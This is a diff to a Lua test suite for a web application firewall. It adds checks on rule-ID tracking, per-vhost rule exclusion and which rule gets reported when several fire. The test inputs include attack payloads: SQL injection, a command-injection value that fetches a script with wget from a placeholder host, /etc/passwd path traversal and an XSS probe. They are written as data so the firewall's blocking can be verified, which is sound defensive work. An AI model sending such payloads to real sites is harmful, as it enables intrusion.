@@ -24,14 +24,17 @@ end
 
 local function run(t)
   local hit, reason, _, action, hits, rule_id = waf.check({
+    skip_rule_ids = t.skip,
     uri = t.uri or "/index.php", args = t.args or "", raw_uri = t.raw_uri or ((t.uri or "/index.php") .. "?" .. (t.args or "")),
     method = t.method or "GET", ip = "203.0.113.5", body = t.body or "",
     headers = { ["user-agent"] = t.ua, accept = "*/*", ["content-type"] = t.ct },
   })
+  local last = hits and hits[#hits]
   local ids = {}
   for _, h in ipairs(hits or {}) do ids[#ids + 1] = tostring(h.waf_rule_id) end
   return { hit = hit, reason = tostring(reason), action = action, rule_id = rule_id,
-           ids = "," .. table.concat(ids, ",") .. "," }
+           ids = "," .. table.concat(ids, ",") .. ",", last = last and last.waf_rule_id,
+           also = "," .. table.concat(waf.also_rule_ids(hits, rule_id), ",") .. "," }
 end
 local function show(r) return r.reason .. "/" .. tostring(r.action) .. " id=" .. tostring(r.rule_id) .. " hits=" .. r.ids end
 local SQLMAP = "sqlmap/1.8.2#stable (https://sqlmap.org)"
@@ -41,6 +44,7 @@ do
   local r = run{ ua = SQLMAP, args = "id=1%27%20UNION%20SELECT%201,2,3--%20-" }
   check(r.reason:find("^WAF_SQLI") and r.action == "block", "sqlmap + UNION SELECT: SQLi is the headline (" .. show(r) .. ")")
   check(r.ids:find(",201,", 1, true), "sqlmap + SQLi: the 201 hit is kept (" .. show(r) .. ")")
+  check(r.last == 201 and r.also:find(",201,", 1, true), "sqlmap + SQLi: 201 appended at ::done::, in also_rule_ids (" .. show(r) .. ")")
 
   r = run{ ua = "Mozilla/5.0 (compatible; Nuclei - Open-source project (github.com/projectdiscovery/nuclei))",
            args = "cmd=x;wget%20http://198.51.100.9/x.sh" }
@@ -56,9 +60,24 @@ do
   local r = run{ ua = SQLMAP, args = "id=1" }
   check(r.reason:find("^WAF_BAD_UA:UA_SQLMAP") and r.action == "block" and r.rule_id == 201,
         "sqlmap alone blocks as 201 (" .. show(r) .. ")")
-  -- Before the held traversal rule: the label stays 201, traversal is kept.
+  -- Before the held traversal rule: the label stays 201 and its block ends
+  -- evaluation, so traversal does not run.
   r = run{ ua = SQLMAP, args = "f=../../../../etc/passwd" }
-  check(r.reason:find("^WAF_BAD_UA") and r.action == "block", "sqlmap + traversal: 201 keeps the headline (" .. show(r) .. ")")
+  check(r.reason:find("^WAF_BAD_UA") and r.action == "block" and not r.ids:find(",101,", 1, true),
+        "sqlmap + traversal: 201 keeps the headline, 101 not reached (" .. show(r) .. ")")
+  -- A per-vhost exclusion of 201 still drops it; traversal then blocks.
+  r = run{ ua = SQLMAP, args = "id=1", skip = { [201] = true } }
+  check(not r.hit, "sqlmap with 201 excluded: no hit (" .. show(r) .. ")")
+  r = run{ ua = SQLMAP, args = "f=../../../../etc/passwd", skip = { [201] = true } }
+  check(r.reason:find("^WAF_TRAVERSAL") and not r.ids:find(",201,", 1, true), "sqlmap + traversal, 201 excluded: traversal (" .. show(r) .. ")")
+  -- A challenge-tier payload behind it: the request still ends in a block.
+  r = run{ ua = SQLMAP, args = "q=%3Cscript%3Ealert(1)%3C/script%3E" }
+  check(r.action == "block" and r.rule_id == 201, "sqlmap + XSS (challenge tier): still a 201 block (" .. show(r) .. ")")
+  -- A held block rule earlier than the deferred spot owns the headline (both
+  -- un-armed at the shipped defaults; documented trade-off).
+  r = run{ ua = SQLMAP, method = "POST", uri = "/wp-admin/admin-ajax.php", ct = "application/x-www-form-urlencoded",
+           body = "action=trp_get_translations_regular&security=abc&language=en_US&string_ids=%5B680%5D" }
+  check(r.rule_id == 10019 and r.ids:find(",201,", 1, true), "sqlmap + TranslatePress id lookup: 10019 headline, 201 kept (" .. show(r) .. ")")
   -- A browser UA is untouched.
   r = run{ ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
            args = "id=1%27%20UNION%20SELECT%201,2,3--%20-" }
